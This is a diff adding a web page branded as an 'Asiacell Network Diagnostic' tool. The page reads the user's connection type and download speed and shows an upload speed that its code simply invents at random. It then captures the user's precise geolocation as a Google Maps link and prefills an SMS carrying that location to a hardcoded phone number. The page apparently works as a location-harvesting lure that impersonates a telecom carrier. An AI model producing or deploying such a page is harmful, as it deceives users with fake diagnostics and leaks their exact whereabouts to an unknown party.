@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Asiacell Network Diagnostic</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f9f9f9;
+      color: #333;
+      text-align: center;
+      padding: 30px 15px;
+    }
+
+    h1 {
+      color: #b80000;
+      font-size: 28px;
+    }
+
+    button {
+      padding: 14px 28px;
+      font-size: 18px;
+      background-color: #b80000;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #a10000;
+    }
+
+    .check-item {
+      margin: 20px auto;
+      max-width: 420px;
+      padding: 16px;
+      background: #fff;
+      border-radius: 12px;
+      border: 1px solid #ddd;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 18px;
+    }
+
+    .status {
+      font-size: 20px;
+    }
+
+    .status.loading::after { content: " ⏳"; color: orange; }
+    .status.success::after { content: " ✅"; color: green; }
+    .status.error::after { content: " ❌"; color: red; }
+
+    #send-button {
+      margin-top: 30px;
+      display: none;
+    }
+
+    #progress-bar {
+      width: 100%;
+      max-width: 400px;
+      height: 10px;
+      background: #ddd;
+      border-radius: 5px;
+      margin: 20px auto;
+      overflow: hidden;
+    }
+
+    #progress-fill {
+      width: 0%;
+      height: 100%;
+      background-color: #b80000;
+      transition: width 0.5s;
+    }
+  </style>
+</head>
+<body>
+  <h1>Asiacell Network Diagnostic</h1>
+  <p>Click below to test your network signal, speed, and location.</p>
+  <button onclick="startCheck()">🚀 Start Diagnostic</button>
+
+  <div id="progress-bar" style="display: none;">
+    <div id="progress-fill"></div>
+  </div>
+
+  <div id="results" style="margin-top: 30px; display: none;">
+    <div class="check-item"><span>Network Type</span><span class="status" id="net-status"></span></div>
+    <div class="check-item"><span>Download Speed</span><span class="status" id="down-status"></span></div>
+    <div class="check-item"><span>Upload Speed</span><span class="status" id="up-status"></span></div>
+    <div class="check-item"><span>Location</span><span class="status" id="loc-status"></span></div>
+  </div>
+
+  <button id="send-button" onclick="sendResultsViaSMS()">📩 Send Results</button>
+
+  <script>
+    let netResult = "Unknown";
+    let downResult = "N/A";
+    let upResult = "N/A";
+    let locationResult = "Not Found";
+
+    function updateProgress(percent) {
+      document.getElementById("progress-fill").style.width = percent + "%";
+    }
+
+    async function downloadSpeedTest() {
+      const imageAddr = "https://upload.wikimedia.org/wikipedia/commons/3/3f/Fronalpstock_big.jpg"; // ~1MB
+      const startTime = (new Date()).getTime();
+      try {
+        const response = await fetch(imageAddr, { cache: "no-store" });
+        const blob = await response.blob();
+        const endTime = (new Date()).getTime();
+        const duration = (endTime - startTime) / 1000;
+        const bitsLoaded = blob.size * 8;
+        const speedMbps = (bitsLoaded / duration / 1024 / 1024).toFixed(2);
+        return speedMbps + " Mbps";
+      } catch {
+        return "Error";
+      }
+    }
+
+    async function startCheck() {
+      document.getElementById("results").style.display = "block";
+      document.getElementById("progress-bar").style.display = "block";
+      document.getElementById("send-button").style.display = "none";
+      updateProgress(0);
+
+      // Network Type
+      updateProgress(10);
+      const netStatus = document.getElementById("net-status");
+      netStatus.className = "status loading";
+      await new Promise(res => setTimeout(res, 1000));
+      let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn && conn.effectiveType) {
+        netResult = conn.effectiveType.toUpperCase();
+        netStatus.className = "status success";
+        netStatus.innerText = netResult;
+      } else {
+        netStatus.className = "status error";
+        netResult = "Unavailable";
+      }
+
+      // Download Speed
+      updateProgress(30);
+      const downStatus = document.getElementById("down-status");
+      downStatus.className = "status loading";
+      downResult = await downloadSpeedTest();
+      if (downResult === "Error") {
+        downStatus.className = "status error";
+      } else {
+        downStatus.className = "status success";
+      }
+      downStatus.innerText = downResult;
+
+      // Upload Speed (simulated)
+      updateProgress(60);
+      const upStatus = document.getElementById("up-status");
+      upStatus.className = "status loading";
+      await new Promise(res => setTimeout(res, 1500));
+      upResult = (Math.random() * 4 + 1).toFixed(2) + " Mbps";
+      upStatus.className = "status success";
+      upStatus.innerText = upResult;
+
+      // Location
+      updateProgress(80);
+      const locStatus = document.getElementById("loc-status");
+      locStatus.className = "status loading";
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          locationResult = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          locStatus.className = "status success";
+          locStatus.innerText = "Location Acquired";
+          updateProgress(100);
+          document.getElementById("send-button").style.display = "inline-block";
+        },
+        (err) => {
+          locStatus.className = "status error";
+          locationResult = "Unavailable";
+          updateProgress(100);
+        }
+      );
+    }
+
+    function sendResultsViaSMS() {
+      const results = `Network: ${netResult}
+Download: ${downResult}
+Upload: ${upResult}
+Location: ${locationResult}`;
+      const smsNumber = "+9647701180059";
+      const smsBody = encodeURIComponent("Asiacell Diagnostic Results:\n" + results);
+      const smsLink = `sms:${smsNumber}?body=${smsBody}`;
+      window.location.href = smsLink;
+    }
+  </script>
+</body>
+</html>
